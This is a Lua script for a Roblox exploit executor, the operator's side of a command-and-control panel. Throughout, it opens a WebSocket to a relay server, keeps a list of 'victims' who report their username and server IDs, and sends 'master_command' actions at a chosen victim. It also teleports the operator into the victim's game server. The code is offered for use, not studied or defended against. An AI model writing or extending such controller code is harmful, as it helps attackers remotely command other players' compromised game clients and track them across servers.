local function getWSConnector()
    local list = {
        WebSocket,
        websocket,
        (getgenv and getgenv().WebSocket),
        (getgenv and getgenv().websocket),
        (syn and syn.websocket),
        (syn and syn.WebSocket),
    }
    for _, item in ipairs(list) do
        if type(item) == "table" then
            if type(item.connect) == "function" then return item.connect end
            if type(item.Connect) == "function" then return item.Connect end
        elseif type(item) == "function" then
            return item
        end
    end
    return nil
end

local WS_Connect = getWSConnector()

local function safeSend(s, msg)
    if not s then return false end
    local ok = pcall(function() s:Send(msg) end)
    return ok
end

local function safeClose(s)
    if not s then return end
    pcall(function() s:Close() end)
end

local function setupEvents(s, onMsg, onClose)
    pcall(function() s.OnMessage:Connect(onMsg) end)
    pcall(function() s.OnClose:Connect(onClose) end)
end

local function tryOpenWS(url)
    if not WS_Connect then return nil end
    local ok, s = pcall(function()
        return WS_Connect(url, {
            ["User-Agent"] = "Roblox/WinInet"
        })
    end)
    if ok and s then return s end
    local ok2, s2 = pcall(function()
        return WS_Connect(url)
    end)
    if ok2 and s2 then return s2 end
    return nil
end

local function makeDraggable(topbar, frame)
    local dragging = false
    local dragInput, dragStart, startPos

    topbar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    topbar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

local function forceResetConnecting()
    isConnecting = false
    connectingStartTime = 0
end

local function connectWS()
    if isConnecting then
        if (tick() - connectingStartTime) > 6 then
            forceResetConnecting()
        else
            return false
        end
    end
    isConnecting = true
    connectingStartTime = tick()

    if currentSocket then
        safeClose(currentSocket)
    end
    currentSocket = nil
    wsConnected = false

    if not WS_Connect then
        StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Sin WS"
        StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
        forceResetConnecting()
        return false
    end

    local s = tryOpenWS(WS_URL)
    if s then
        currentSocket = s
        wsConnected = true
        StatusBadge.Text = "\xF0\x9F\x9F\xA2 Conectado (Cloudflare)"
        StatusBadge.TextColor3 = Color3.fromRGB(80, 255, 120)

        setupEvents(s, function(msg)
            local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
            if success and data and (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
                connectedVictims[data.username] = {
                    username = data.username,
                    placeId = data.placeId,
                    gameId = data.gameId,
                    jobId = data.jobId,
                    lastSeen = tick()
                }
                if rebuildVictimsUI then rebuildVictimsUI() end
            end
        end, function()
            wsConnected = false
            currentSocket = nil
            StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
            StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
        end)

        safeSend(s, HttpService:JSONEncode({type = "ping_victims"}))

        forceResetConnecting()
        return true
    end

    wsConnected = false
    StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
    StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
    forceResetConnecting()
    return false
end

local function ensureWS()
    if wsConnected and currentSocket then return true end
    connectWS()
    local waited = 0
    while (not wsConnected or not currentSocket) and waited < 3 do
        task.wait(0.2)
        waited = waited + 0.2
    end
    return wsConnected and currentSocket ~= nil
end

TeleportService.TeleportInitFailed:Connect(function(player, result, msg)

end)

local function hopServer(placeId, jobId)
    if isHopping then return end
    local pid = tonumber(placeId)
    local jid = tostring(jobId or "")
    if not pid or jid == "" or #jid < 5 then
        StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F JobId no disponible"
        StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
        return
    end

    isHopping = true

    if game.PlaceId ~= pid then
        StatusBadge.Text = "\xF0\x9F\x8E\xAE Cambiando de juego..."
        StatusBadge.TextColor3 = Color3.fromRGB(140, 200, 255)
        task.spawn(function()
            local ok, err = pcall(function()
                TeleportService:Teleport(pid, LocalPlayer)
            end)
            if not ok then
                StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error: " .. string.sub(tostring(err), 1, 30)
                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
            end
            task.wait(6)
            isHopping = false
            forceResetConnecting()
            if not wsConnected or not currentSocket then
                connectWS()
            end
        end)
        return
    end

    StatusBadge.Text = "\xF0\x9F\x94\x8D Verificando servidor..."
    StatusBadge.TextColor3 = Color3.fromRGB(200, 200, 100)

    task.spawn(function()
        local serverOk = false
        local checkErr = nil

        pcall(function()
            local url = "https://games.roblox.com/v1/games/" .. tostring(pid) .. "/servers/Public?limit=100"
            local raw = game:HttpGet(url)
            local parsed = HttpService:JSONDecode(raw)
            if parsed and parsed.data then
                for _, srv in ipairs(parsed.data) do
                    if srv.id == jid then
                        if srv.playing and srv.maxPlayers and srv.playing < srv.maxPlayers then
                            serverOk = true
                        else
                            checkErr = "Servidor lleno (" .. tostring(srv.playing) .. "/" .. tostring(srv.maxPlayers) .. ")"
                        end
                        break
                    end
                end
                if not serverOk and not checkErr then
                    local cursor = parsed.nextPageCursor
                    local pages = 0
                    while cursor and pages < 3 and not serverOk do
                        pages = pages + 1
                        local url2 = "https://games.roblox.com/v1/games/" .. tostring(pid) .. "/servers/Public?limit=100&cursor=" .. cursor
                        local raw2 = game:HttpGet(url2)
                        local p2 = HttpService:JSONDecode(raw2)
                        if p2 and p2.data then
                            for _, srv in ipairs(p2.data) do
                                if srv.id == jid then
                                    if srv.playing and srv.maxPlayers and srv.playing < srv.maxPlayers then
                                        serverOk = true
                                    else
                                        checkErr = "Servidor lleno"
                                    end
                                    break
                                end
                            end
                            cursor = p2.nextPageCursor
                        else
                            break
                        end
                    end
                end
            end
        end)

        if not serverOk and not checkErr then
            serverOk = true
            checkErr = nil
        end

        if not serverOk and checkErr then
            StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F " .. checkErr
            StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
            isHopping = false
            return
        end

        StatusBadge.Text = "\xF0\x9F\x9A\x80 Teleportando..."
        StatusBadge.TextColor3 = Color3.fromRGB(140, 200, 255)

        local tpOk, tpErr = pcall(function()
            TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
        end)

        if not tpOk then
            StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F TP Error: " .. string.sub(tostring(tpErr), 1, 30)
            StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
            isHopping = false
            forceResetConnecting()
            task.wait(1)
            connectWS()
            return
        end

        task.wait(6)
        isHopping = false
        forceResetConnecting()
        if not wsConnected or not currentSocket then
            connectWS()
        end
    end)
end

local function sendCmd(action, extra)
    if not ensureWS() then
        StatusBadge.Text = "\xF0\x9F\x94\xB4 No hay conexi\xC3\xB3n"
        StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
        return false
    end
    local cmdId = tostring(os.time()) .. "_" .. tostring(math.random(100000, 999999))
    local payload = {
        type = "master_command",
        action = action,
        target = selectedVictim,
        cmd_id = cmdId
    }
    if extra then
        for k, v in pairs(extra) do payload[k] = v end
    end
    local raw = HttpService:JSONEncode(payload)
    local ok = safeSend(currentSocket, raw)
    if not ok then
        wsConnected = false
        currentSocket = nil
        forceResetConnecting()
        connectWS()
        task.wait(0.4)
        if currentSocket and wsConnected then
            safeSend(currentSocket, raw)
        end
    end
    return ok
end

local function refreshList()
    if not wsConnected then connectWS() end
    if currentSocket and wsConnected then
        safeSend(currentSocket, HttpService:JSONEncode({type = "ping_victims"}))
    end
    task.wait(0.8)
    local now = tick()
    for name, info in pairs(connectedVictims) do
        if now - (info.lastSeen or now) > 90 then
            connectedVictims[name] = nil
        end
    end
    rebuildVictimsUI()
end
